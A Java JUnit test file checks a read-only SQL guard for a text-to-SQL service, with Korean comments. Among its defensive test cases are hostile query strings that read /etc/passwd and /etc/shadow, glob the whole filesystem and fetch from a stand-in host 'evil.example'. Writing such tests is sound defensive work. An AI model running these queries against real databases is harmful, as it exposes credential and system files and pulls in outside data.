package com.miniwatson.service;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * requireReadOnly: SELECT/WITH 전용 가드. 쓰기/DDL 키워드를 막아 텍스트-to-SQL 경로의
 * 사고성 데이터 변경을 차단한다. DuckDB 연결이 필요한 runSelect 대신 가드만 순수 테스트.
 */
class TabularSqlServiceTest {

    @Test
    void allowsSelect() {
        assertDoesNotThrow(() -> TabularSqlService.requireReadOnly("SELECT * FROM t"));
    }

    @Test
    void allowsWith() {
        assertDoesNotThrow(() ->
                TabularSqlService.requireReadOnly("WITH x AS (SELECT 1) SELECT * FROM x"));
    }

    @Test
    void isCaseInsensitive() {
        assertDoesNotThrow(() -> TabularSqlService.requireReadOnly("select * from t"));
    }

    @Test
    void allowsLeadingAndTrailingWhitespace() {
        assertDoesNotThrow(() -> TabularSqlService.requireReadOnly("  SELECT 1  "));
    }

    @Test
    void rejectsDrop() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("DROP TABLE t"));
    }

    @Test
    void rejectsDelete() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("DELETE FROM t"));
    }

    @Test
    void rejectsUpdate() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("UPDATE t SET a = 1"));
    }

    @Test
    void rejectsInsert() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("INSERT INTO t VALUES (1)"));
    }

    // --- 보안: DuckDB 파일시스템 함수 차단 (SELECT 안에서도 임의 파일을 읽으므로) ---

    @Test
    void rejectsReadCsvAuto() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("SELECT * FROM read_csv_auto('/etc/passwd')"));
    }

    @Test
    void rejectsReadText() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("SELECT read_text('/etc/shadow')"));
    }

    @Test
    void rejectsReadParquet() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("SELECT * FROM read_parquet('/data/secret.parquet')"));
    }

    @Test
    void rejectsGlob() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("SELECT * FROM glob('/**')"));
    }

    @Test
    void rejectsHttpfsExfil() {
        assertThrows(IllegalArgumentException.class,
                () -> TabularSqlService.requireReadOnly("SELECT * FROM read_csv_auto('https://evil.example/x.csv')"));
    }

    @Test
    void stillAllowsNormalTableSelect() {
        assertDoesNotThrow(() ->
                TabularSqlService.requireReadOnly("SELECT region, SUM(revenue_musd) FROM revenue GROUP BY region"));
    }
}
